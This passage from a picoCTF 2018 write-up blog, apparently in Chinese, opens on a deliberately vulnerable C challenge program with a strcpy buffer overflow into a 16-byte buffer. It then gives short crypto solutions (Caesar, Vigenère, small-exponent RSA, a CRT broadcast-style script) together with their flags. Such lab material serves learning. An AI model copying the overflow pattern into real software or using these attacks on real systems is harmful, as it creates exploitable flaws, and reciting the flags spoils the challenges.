</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;signal.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#75715e>#define FLAGSIZE_MAX 64
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>char</span> flag[FLAGSIZE_MAX];
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>sigsegv_handler</span>(<span style=color:#66d9ef>int</span> sig) {
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>fprintf</span>(stderr, <span style=color:#e6db74>&#34;%s</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, flag);
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>fflush</span>(stderr);
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>exit</span>(<span style=color:#ae81ff>1</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>vuln</span>(<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>input){
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>char</span> buf[<span style=color:#ae81ff>16</span>];
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>strcpy</span>(buf, input);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>int</span> argc, <span style=color:#66d9ef>char</span> <span style=color:#f92672>**</span>argv){
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>  FILE <span style=color:#f92672>*</span>f <span style=color:#f92672>=</span> <span style=color:#a6e22e>fopen</span>(<span style=color:#e6db74>&#34;flag.txt&#34;</span>,<span style=color:#e6db74>&#34;r&#34;</span>);
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (f <span style=color:#f92672>==</span> NULL) {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>exit</span>(<span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>fgets</span>(flag,FLAGSIZE_MAX,f);
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>signal</span>(SIGSEGV, sigsegv_handler);
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>gid_t</span> gid <span style=color:#f92672>=</span> <span style=color:#a6e22e>getegid</span>();
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>setresgid</span>(gid, gid, gid);
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (argc <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>1</span>) {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>vuln</span>(argv[<span style=color:#ae81ff>1</span>]);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Thanks! Received: %s&#34;</span>, argv[<span style=color:#ae81ff>1</span>]);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>else</span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;This program takes 1 argument.</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></td></tr></table></div></div><h1 id=cryptography>Cryptography<a hidden class=anchor aria-hidden=true href=#cryptography>#</a></h1><h2 id=crypto-warmup-1>Crypto Warmup 1<a hidden class=anchor aria-hidden=true href=#crypto-warmup-1>#</a></h2><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-22-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-22-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-22-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-22-2>2</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>&gt;&gt;&gt;</span> print <span style=color:#e6db74>&#34;picoCTF{</span><span style=color:#e6db74>%s</span><span style=color:#e6db74>}&#34;</span><span style=color:#f92672>%</span><span style=color:#e6db74>&#39;&#39;</span><span style=color:#f92672>.</span>join(map(<span style=color:#66d9ef>lambda</span> x:chr((ord(x[<span style=color:#ae81ff>0</span>])<span style=color:#f92672>-</span>ord(x[<span style=color:#ae81ff>1</span>]))<span style=color:#f92672>%</span><span style=color:#ae81ff>26</span><span style=color:#f92672>+</span>ord(<span style=color:#e6db74>&#39;a&#39;</span>)),zip(<span style=color:#e6db74>&#39;llkjmlmpadkkc&#39;</span>,<span style=color:#e6db74>&#39;thisisalilkey&#39;</span>)))<span style=color:#f92672>.</span>upper()
</span></span><span style=display:flex><span>picoCTF{SECRETMESSAGE}
</span></span></code></pre></td></tr></table></div></div><h2 id=caesar-cipher-2>caesar cipher 2<a hidden class=anchor aria-hidden=true href=#caesar-cipher-2>#</a></h2><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-23-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-23-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-23-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-23-2>2</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#e6db74>&#39;&#39;</span><span style=color:#f92672>.</span>join(map(<span style=color:#66d9ef>lambda</span> x:chr((ord(x)<span style=color:#f92672>+</span><span style=color:#ae81ff>32</span>)<span style=color:#f92672>%</span><span style=color:#ae81ff>0xff</span>),<span style=color:#e6db74>&#39;PICO#4&amp;[C!ESA2?#I0H%R3?JU34?A2%N4?S%C5R%]&#39;</span>))
</span></span><span style=display:flex><span><span style=color:#75715e># &#39;picoCTF{cAesaR_CiPhErS_juST_aREnT_sEcUrE}&#39;</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=hertz>hertz<a hidden class=anchor aria-hidden=true href=#hertz>#</a></h2><p>替换密码。</p><p>在线工具：</p><ul><li><a href=https://www.guballa.de/substitution-solver>https://www.guballa.de/substitution-solver</a></li><li><a href=https://quipqiup.com/>https://quipqiup.com/</a></li></ul><p><img loading=lazy src=63e3abab50cf3ed47.png alt></p><h2 id=blaises-cipher>blaise&rsquo;s cipher<a hidden class=anchor aria-hidden=true href=#blaises-cipher>#</a></h2><p>在线解密即可：https://www.dcode.fr/vigenere-cipher 。逐步得到KEY长度为4，KEY为<code>FLAG</code></p><p><code>picoCTF{v1gn3r3_c1ph3rs_ar3n7_bad_901e13a1}</code></p><h2 id=heading><a hidden class=anchor aria-hidden=true href=#heading>#</a></h2><h2 id=safe-rsa>Safe RSA<a hidden class=anchor aria-hidden=true href=#safe-rsa>#</a></h2><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-24-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-24-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-24-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-24-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-24-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-24-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-24-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-24-4>4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-24-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-24-5>5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-24-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-24-6>6</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> gmpy2<span style=color:#f92672>,</span>binascii
</span></span><span style=display:flex><span>e<span style=color:#f92672>=</span><span style=color:#ae81ff>3</span>
</span></span><span style=display:flex><span>c<span style=color:#f92672>=</span><span style=color:#ae81ff>2205316413931134031046440767620541984801091216351222789180593875373829950860542792110364325728088504479780803714561464250589795961097670884274813261496112882580892020487261058118157619586156815531561455215290361274334977137261636930849125</span>
</span></span><span style=display:flex><span>m<span style=color:#f92672>=</span>gmpy2<span style=color:#f92672>.</span>iroot(c,e)[<span style=color:#ae81ff>0</span>]
</span></span><span style=display:flex><span>print binascii<span style=color:#f92672>.</span>unhexlify(hex(m)<span style=color:#f92672>.</span>strip(<span style=color:#e6db74>&#39;lL&#39;</span>)[<span style=color:#ae81ff>2</span>:])
</span></span><span style=display:flex><span><span style=color:#75715e># picoCTF{e_w4y_t00_sm411_9f5d2464}</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=xsuper-safe-rsa>【X】Super Safe RSA<a hidden class=anchor aria-hidden=true href=#xsuper-safe-rsa>#</a></h2><p>参考<a href=https://findneo.github.io/180727rsa-attack/#%E5%B9%BF%E6%92%AD%E6%94%BB%E5%87%BB>RSA的广播攻击</a> 。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-25-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-25-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-25-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-25-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-25-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-25-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-25-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-25-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-25-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-25-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-25-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-25-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-25-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-25-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-25-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-25-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-25-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-25-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-25-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-25-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-25-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-25-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-25-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-25-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-25-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-25-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-25-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-25-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-25-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-25-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-25-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-25-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-25-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-25-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-25-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-25-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-25-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-25-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-25-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-25-20>20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-25-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-25-21>21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-25-22><a style=outline:none;text-decoration:none;color:inherit href=#hl-25-22>22</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-25-23><a style=outline:none;text-decoration:none;color:inherit href=#hl-25-23>23</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-25-24><a style=outline:none;text-decoration:none;color:inherit href=#hl-25-24>24</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-25-25><a style=outline:none;text-decoration:none;color:inherit href=#hl-25-25>25</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-25-26><a style=outline:none;text-decoration:none;color:inherit href=#hl-25-26>26</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-25-27><a style=outline:none;text-decoration:none;color:inherit href=#hl-25-27>27</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-25-28><a style=outline:none;text-decoration:none;color:inherit href=#hl-25-28>28</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-25-29><a style=outline:none;text-decoration:none;color:inherit href=#hl-25-29>29</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-25-30><a style=outline:none;text-decoration:none;color:inherit href=#hl-25-30>30</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-25-31><a style=outline:none;text-decoration:none;color:inherit href=#hl-25-31>31</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-25-32><a style=outline:none;text-decoration:none;color:inherit href=#hl-25-32>32</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-25-33><a style=outline:none;text-decoration:none;color:inherit href=#hl-25-33>33</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-25-34><a style=outline:none;text-decoration:none;color:inherit href=#hl-25-34>34</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-25-35><a style=outline:none;text-decoration:none;color:inherit href=#hl-25-35>35</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-25-36><a style=outline:none;text-decoration:none;color:inherit href=#hl-25-36>36</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-25-37><a style=outline:none;text-decoration:none;color:inherit href=#hl-25-37>37</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-25-38><a style=outline:none;text-decoration:none;color:inherit href=#hl-25-38>38</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-25-39><a style=outline:none;text-decoration:none;color:inherit href=#hl-25-39>39</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-25-40><a style=outline:none;text-decoration:none;color:inherit href=#hl-25-40>40</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-25-41><a style=outline:none;text-decoration:none;color:inherit href=#hl-25-41>41</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-25-42><a style=outline:none;text-decoration:none;color:inherit href=#hl-25-42>42</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-25-43><a style=outline:none;text-decoration:none;color:inherit href=#hl-25-43>43</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-PYTHON data-lang=PYTHON><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/env python</span>
</span></span><span style=display:flex><span><span style=color:#75715e># -*- coding: utf-8 -*-</span>
</span></span><span style=display:flex><span><span style=color:#75715e># __author__ = findneo</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> gmpy2<span style=color:#f92672>,</span>re
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> connect
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> time <span style=color:#f92672>import</span> sleep
</span></span><span style=display:flex><span>c<span style=color:#f92672>=</span>[]
</span></span><span style=display:flex><span>n<span style=color:#f92672>=</span>[]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>with</span> open(<span style=color:#e6db74>&#39;buf&#39;</span>,<span style=color:#e6db74>&#39;r&#39;</span>) <span style=color:#66d9ef>as</span> f:
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> f<span style=color:#f92672>.</span>readlines():
</span></span><span style=display:flex><span>        j<span style=color:#f92672>=</span>i<span style=color:#f92672>.</span>strip()<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#39; &#39;</span>)
</span></span><span style=display:flex><span>        c<span style=color:#f92672>.</span>append(int(j[<span style=color:#ae81ff>0</span>]))
</span></span><span style=display:flex><span>        n<span style=color:#f92672>.</span>append(int(j[<span style=color:#ae81ff>1</span>]))
</span></span><span style=display:flex><span>print <span style=color:#e6db74>&#34;mytag:&#34;</span>,len(c)
</span></span><span style=display:flex><span><span style=color:#66d9ef>with</span> open(<span style=color:#e6db74>&#39;buf&#39;</span>,<span style=color:#e6db74>&#39;a&#39;</span>) <span style=color:#66d9ef>as</span> f:
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>while</span> len(c)<span style=color:#f92672>&lt;</span><span style=color:#ae81ff>65538</span>:
</span></span><span style=display:flex><span>        r<span style=color:#f92672>=</span>connect(<span style=color:#e6db74>&#39;2018shell2.picoctf.com&#39;</span>,<span style=color:#ae81ff>24039</span>)
</span></span><span style=display:flex><span>        res<span style=color:#f92672>=</span>r<span style=color:#f92672>.</span>recv()
</span></span><span style=display:flex><span>        g<span style=color:#f92672>=</span>re<span style=color:#f92672>.</span>findall(<span style=color:#e6db74>&#39;c: (\d+)</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>n: (\d+)</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>.*&#39;</span>,res)[<span style=color:#ae81ff>0</span>]
</span></span><span style=display:flex><span>        f<span style=color:#f92672>.</span>write(<span style=color:#e6db74>&#39; &#39;</span><span style=color:#f92672>.</span>join(g)<span style=color:#f92672>+</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>        c<span style=color:#f92672>.</span>append(g[<span style=color:#ae81ff>0</span>])
</span></span><span style=display:flex><span>        n<span style=color:#f92672>.</span>append(g[<span style=color:#ae81ff>1</span>])
</span></span><span style=display:flex><span>        r<span style=color:#f92672>.</span>close()
</span></span><span style=display:flex><span>        <span style=color:#75715e># sleep(0.1)</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> len(c)<span style=color:#f92672>%</span><span style=color:#ae81ff>1000</span><span style=color:#f92672>==</span><span style=color:#ae81ff>0</span>:
</span></span><span style=display:flex><span>            print <span style=color:#e6db74>&#39;mytag:&#39;</span>,len(c)
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>GCRT</span>(mi, ai):
</span></span><span style=display:flex><span>    <span style=color:#75715e># mi,ai分别表示模数和取模后的值,都为列表结构</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>assert</span> (isinstance(mi, list) <span style=color:#f92672>and</span> isinstance(ai, list))
</span></span><span style=display:flex><span>    curm, cura <span style=color:#f92672>=</span> mi[<span style=color:#ae81ff>0</span>], ai[<span style=color:#ae81ff>0</span>]
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> (m, a) <span style=color:#f92672>in</span> zip(mi[<span style=color:#ae81ff>1</span>:], ai[<span style=color:#ae81ff>1</span>:]):
</span></span><span style=display:flex><span>        d <span style=color:#f92672>=</span> gmpy2<span style=color:#f92672>.</span>gcd(curm, m)
</span></span><span style=display:flex><span>        c <span style=color:#f92672>=</span> a <span style=color:#f92672>-</span> cura
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>assert</span> (c <span style=color:#f92672>%</span> d <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>) <span style=color:#75715e>#不成立则不存在解</span>
</span></span><span style=display:flex><span>        K <span style=color:#f92672>=</span> c <span style=color:#f92672>/</span> d <span style=color:#f92672>*</span> gmpy2<span style=color:#f92672>.</span>invert(curm <span style=color:#f92672>/</span> d, m <span style=color:#f92672>/</span> d)
</span></span><span style=display:flex><span>        cura <span style=color:#f92672>+=</span> curm <span style=color:#f92672>*</span> K
</span></span><span style=display:flex><span>        curm <span style=color:#f92672>=</span> curm <span style=color:#f92672>*</span> m <span style=color:#f92672>/</span> d
</span></span><span style=display:flex><span>        cura <span style=color:#f92672>%=</span> curm
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> (cura <span style=color:#f92672>%</span> curm, curm) <span style=color:#75715e>#(解,最小公倍数)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>print GCRT(n,c)[<span style=color:#ae81ff>0</span>]
</span></span></code></pre></td></tr></table></div></div><h2 id=heeeeeeeres-johnny>HEEEEEEERE&rsquo;S Johnny!<a hidden class=anchor aria-hidden=true href=#heeeeeeeres-johnny>#</a></h2><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-26-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-26-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-26-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-26-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-26-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-26-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-26-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-26-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-26-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-26-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-26-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-26-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-26-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-26-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-26-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-26-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-26-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-26-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-26-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-26-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-26-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-26-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-26-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-26-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-26-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-26-13>13</a>
